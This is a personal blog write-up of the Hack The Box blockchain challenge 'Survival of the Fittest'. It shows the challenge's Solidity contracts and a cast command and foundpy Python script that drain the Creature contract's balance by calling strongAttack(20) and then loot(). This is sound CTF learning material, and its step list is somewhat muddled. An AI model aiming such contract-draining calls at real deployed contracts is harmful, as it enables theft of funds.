---
title: Survival of the Fittest Challenge
date: 2024-12-2 +0700
categories: [HTB, Blockchain]
tags: [Self-Development]
image:
  path: /images/Survival%20of%20the%20Fittest%201.png
description: A write-up from a challenge at Hack The Box
author: <author_id>
---

## Information
First of all i was given an URL, here is the first look:
![First Look at the Website](/images/Survival%20of%20the%20Fittest%201.png)

There is just a restart button and an attack button, but no matter how many times i press the attack button it wont just die, alright since there is docs, Home, and Connection page on the header, let's visit it one by one

## Home
Yeah the same as the pciture above

## Docs
![Docs Section](/images/Survival%20of%20the%20Fittest%202.png)
Turns out it give you all the information you need to solve the challenge, hold it dearly and read carefully!

## Connection
![Connection Section](/images/Survival%20of%20the%20Fittest%203.png)
This section is the core information you need to solve the Challenge, alright everything has been written down, lets try to solve the challenge!

## Understanding the Workflow
There are two files given to the challengers to help them solve the challenge, here are the two files:

```text
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Creature} from "./Creature.sol";

contract Setup {
    Creature public immutable TARGET;

    constructor() payable {
        require(msg.value == 1 ether);
        TARGET = new Creature{value: 10}();
    }
    
    function isSolved() public view returns (bool) {
        return address(TARGET).balance == 0;
    }
}
```
{: file="setup.sol"}

```text
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Creature {
    
    uint256 public lifePoints;
    address public aggro;

    constructor() payable {
        lifePoints = 20;
    }

    function strongAttack(uint256 _damage) external{
        _dealDamage(_damage);
    }
    
    function punch() external {
        _dealDamage(1);
    }

    function loot() external {
        require(lifePoints == 0, "Creature is still alive!");
        payable(msg.sender).transfer(address(this).balance);
    }

    function _dealDamage(uint256 _damage) internal {
        aggro = msg.sender;
        lifePoints -= _damage;
    }
}
```
{: file="Creature.sol"}

now the goal here is to call the isSolved() function and make it true by making the balance zero, how to do that?

now let's take a look at the Creature.sol, there are two function to attack the creature, strongAttack function and punch function, if we use punch() the creature will get damaged one at a time, meanwhile the strongAttack() will deal damage according to (_damage), now you will get confused here if you just started learning blockchain like me at this time, what is _damage? you see there at the code that _damage is an uint256, it's a variable, and on blockchain, a variable, we can send any value into it, so the base payload gonna be:

`
cast send $ADDRESS_TARGET "functionWithArgs(uint)" 20 --rpc-url $RPC_URL --private-key $PRIVATE_KEY
`

alright now im going to demonstrate using foundpy since foundry is a pain in the ass if it's not on debian, let's use with the broad accessability shall we?

first of all if you guys want to follow my path by using foundpy too, you can learn how to use it on this documentation made by him
<https://pydigger.com/pypi/foundpy>

alright here is the setup to attack the creature
```javascript
from foundpy import *
config.from_htb(address="$DESTINATION")
config.setup(
    rpc_url="$RPC_URL",
    privkey="$0xsomething"
)
target_addr = "$0xsomething"
# to attack the creature
cast.send(target_addr, "strongAttack(uint256)", 20)
 # hey dont forget to loot it otherwise you wont get the flag!
cast.send(target_addr, "loot()")

# now call the isSolved to get the flag :3
setup_addr = "$0xsomething"
print(cast.call(setup_addr, "isSolved()"))
```
{: file="attack.py"}

here is the step by step on how to use foundpy based on my experience
1. initialize config.from_htb
2. command the config.from_htb
3. input the `rpc_url` and the `privkey` and the `target_addr` from the data you just fetch from the python config
4. now use the cast send to interact with the `strongAttack()` and `loot()` function
5. after you already interact with those two functions, disable them by command it
6. now input the `setup_addr` from the data you already got on step 1
7. lastly, call the function and print the output, if the output is something like this
`b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01'`
8. Congratulations! you just solved a blockchain challenge! keep up the good work~
9. now access the http://url/flag to get you flag and submit it to the HTB to mark it as solved

that's all to do the Survival of the Fittest Challenges
thank you for reading :3



